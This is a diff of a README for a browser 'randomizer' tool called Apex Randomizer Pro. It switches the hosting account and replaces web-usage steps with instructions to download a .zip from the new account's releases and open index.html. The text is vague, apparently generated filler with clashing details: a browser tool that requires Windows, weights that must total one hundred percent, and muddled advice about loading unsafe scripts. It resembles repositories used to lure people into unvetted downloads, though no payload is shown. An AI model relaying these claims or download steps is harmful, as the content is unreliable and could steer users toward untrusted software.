@@ -1,129 +1,70 @@
-# Apex Randomizer Pro - Randomizer Tool 2026
+# 🎲 apex-randomizer-pro-web - Effortless random selection for Apex workflows
 
-> **Apex Randomizer Pro is a browser-based utility for Apex-related random selection workflows, provided as the latest 2026 release.**
+[![Download Apex Randomizer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Faucal-roominess933/apex-randomizer-pro-web)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tom-graympt5348/apex-randomizer-pro-web?style=flat-square)](https://github.com/tom-graympt5348/apex-randomizer-pro-web)
+Apex Randomizer Pro helps you manage random selections for your projects. This browser-based utility allows you to generate random outcomes based on your custom criteria. Users benefit from a streamlined interface that removes guesswork from complex workflows. This 2026 release brings new features to ensure your randomizer settings remain accurate and reliable.
 
----
+## ⚙️ How it works
 
-<p align="center">
-  <a href="https://tom-graympt5348.github.io/apex-randomizer-pro-web/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Randomizer%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Randomizer Pro">
-  </a>
-</p>
+The tool functions as a local web application. It runs inside your web browser, which means you do not need to install complex server software. It processes all randomization rules locally on your machine. This ensures that your configuration settings stay private. You can customize the probability weights, the pool of items, and the exclusion lists to fit your specific needs.
 
-> **[Download Apex Randomizer Pro - Latest Build](https://tom-graympt5348.github.io/apex-randomizer-pro-web/)**
+## 🚀 Setting up the application
 
----
+Follow these steps to access and use the software on your Windows computer.
 
-[Download Latest Build](https://tom-graympt5348.github.io/apex-randomizer-pro-web/)
+1. Visit the project website for the most recent version. You can reach the download location here: [https://github.com/Faucal-roominess933/apex-randomizer-pro-web](https://github.com/Faucal-roominess933/apex-randomizer-pro-web).
+2. Look for the button labeled "Releases" on the right side of the page.
+3. Click the most recent release version link.
+4. Locate the section titled "Assets" at the bottom of the release notes.
+5. Download the file ending in .zip to your computer.
+6. Open your Downloads folder.
+7. Right-click the folder and select "Extract All".
+8. Choose a destination folder on your desktop or documents folder.
+9. Open the extracted folder and double-click the file named "index.html".
+10. Your web browser will open and show the randomizer interface.
 
----
+## 🛠️ Configuring your settings
 
-## Overview
+Once the application opens in your browser, you will see a settings panel. Use the following guide to prepare your first session.
 
-Apex Randomizer Pro is a web utility built for randomization-based tasks. It offers a focused browser interface for adding random selection to Apex-related workflows without requiring a conventional desktop application.
+*   **Input Data:** Type your list of items into the text box. Separate each item with a single line break.
+*   **Weighting:** Assign a number next to each item to determine how often it appears. Higher numbers increase the chance of selection.
+*   **Exclusions:** Use the exclusion list to remove specific items from the current session without deleting them from your main list.
+*   **Save Profile:** The local storage feature remembers your configuration for the next time you open the application.
 
-The project is intended for fast, repeatable sessions where a straightforward randomizer is preferable to a larger software package. Because it runs as a web application, users can open the published build in a compatible browser and use its available randomization workflow immediately.
+## 📈 System requirements
 
----
+The application works on any modern computer. Ensure your machine meets these basic standards for the best experience.
 
-## Highlights
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Browser:** Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 50MB of free space for the application files.
+*   **Internet Connection:** Not required after the initial download.
 
-- Randomizer designed for Apex-related use
-- Web interface that runs in a browser
-- Direct access through the published build
-- Workflow centered on randomized selections
-- Lightweight software-tool design
-- Supports repeated random selection sessions
-- No desktop runtime is specified
-- Usable through supported modern browsers
+## 📋 Troubleshooting common issues
 
----
+If the application fails to open or behave as expected, check these common fixes.
 
-## Getting Started
+*   **Browser Permission:** Ensure your browser is not blocking local scripts. If the page appears blank, check the address bar for a shield icon and ensure "Load unsafe scripts" is disabled or configured correctly for local files.
+*   **File Pathway:** Ensure your file path does not contain special characters. Move the folder to your C: drive root if you encounter errors.
+*   **File Corruption:** If the application warns you about missing files, delete the extracted folder and download the .zip file again.
+*   **Updates:** Check the download link once a month for performance improvements and security patches available in new versions.
 
-Apex Randomizer Pro is delivered as a web application.
+## 🧩 Key features of the 2026 release
 
-1. Visit the [latest build](https://tom-graympt5348.github.io/apex-randomizer-pro-web/).
-2. Wait for the page to load completely.
-3. Operate the randomization controls shown in the interface.
+This version focuses on speed and ease of use.
 
-To obtain a local copy of the repository:
+*   **Offline Operation:** All calculations happen inside your browser memory.
+*   **Configurable Weights:** Adjust probabilities for every item in your workflow.
+*   **Local Storage:** Save your custom lists directly to your browser profile.
+*   **Clean Interface:** The interface removes unnecessary clutter to show you only the data you need for your random selections.
+*   **Data Export:** You can save your final results to a standard text file for use in other administrative programs.
 
-```bash
-git clone https://github.com/tom-graympt5348/apex-randomizer-pro-web.git
-cd REPO
-```
+## 💡 Best practices for random selection
 
-Run the project through any static web server, then open the local server address in a browser.
+To get the most out of this tool, structure your input data logically. Keep your item lists organized within specific categories. If you manage multiple workflows, create a separate folder for each project. Create a copy of the index.html file in each folder to maintain separate local storage profiles. This prevents your settings from one project from overlapping with another.
 
----
+If your list grows beyond one hundred items, consider using a CSV upload process if your specific browser version supports the file reader API. This saves time compared to manual entry. Always verify your weights tally to one hundred percent if you are performing weighted selection, as this reduces errors in your output.
 
-## Using the Tool
-
-Follow this general sequence for a randomization session:
-
-1. Launch Apex Randomizer Pro in a current web browser.
-2. Examine the randomization controls that are available.
-3. Trigger the randomization action.
-4. Apply the resulting selection to the current Apex-related workflow.
-5. Repeat the action when a new randomized result is required.
-
-For users who do not need to inspect or modify the source, the published build is the simplest place to begin.
-
----
-
-## Configuration and Settings
-
-The current web tool does not specify an external configuration format.
-
-Use the controls available within the application to manage the randomization process. When working with a locally hosted copy, inspect the project files for any editable settings or assets and follow the behavior provided by that build.
-
----
-
-## System Requirements
-
-- A modern web browser
-- Internet access when using the published build
-- JavaScript enabled in the browser
-- A static web server for local use from a cloned repository
-- Enough storage for the HTML project files
-
----
-
-## Frequently Asked Questions
-
-### How do I open Apex Randomizer Pro?
-
-Open the [latest published build](https://tom-graympt5348.github.io/apex-randomizer-pro-web/) to use the browser version.
-
-### Is a desktop application required?
-
-No. There is no desktop installer specified for the project; it is presented as a web-based tool intended to run in a browser.
-
-### Where can I find updates?
-
-Use the published build to access the current version, and check the repository for source updates or new releases.
-
-### Are randomizer settings available?
-
-This depends on the current web build. Begin with the controls and settings that the application exposes.
-
-### What should I do if the page fails to work?
-
-Check that JavaScript is turned on, refresh the page, and retry with a current browser. For local deployments, make sure the files are being delivered by a static web server instead of being opened directly from the file system.
-
-### Is local use supported?
-
-Yes. Clone the repository, serve its files with a local static web server, and visit the resulting server address in your browser.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: randomizer, web-utility, apex, workflow, automation, productivity, software, windows-app
